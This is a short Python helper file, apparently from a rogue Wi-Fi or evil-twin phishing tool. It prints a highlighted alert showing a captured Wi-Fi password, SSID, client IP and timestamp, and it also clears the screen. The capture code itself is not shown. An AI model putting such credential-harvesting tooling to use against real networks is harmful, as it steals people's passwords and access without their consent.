import os

from colorama import Fore, Style


def notify_password_captured(credentials):
    """Function to notify when password is captured"""
    print(Fore.YELLOW + Style.BRIGHT + "\n[!] ALERT: Password captured!\n"
                                       f"    Timestamp: {credentials['timestamp']}\n"
                                       f"    SSID: {credentials['ssid']}\n"
                                       f"    Password: {credentials['password']}\n"
                                       f"    Client IP: {credentials['client_ip']}\n" + Style.RESET_ALL)


def clear_screen():
    # for windows
    if os.name == 'nt':  # for Windows OS
        os.system('cls')
    else:  # for linux Distros
        os.system('clear')
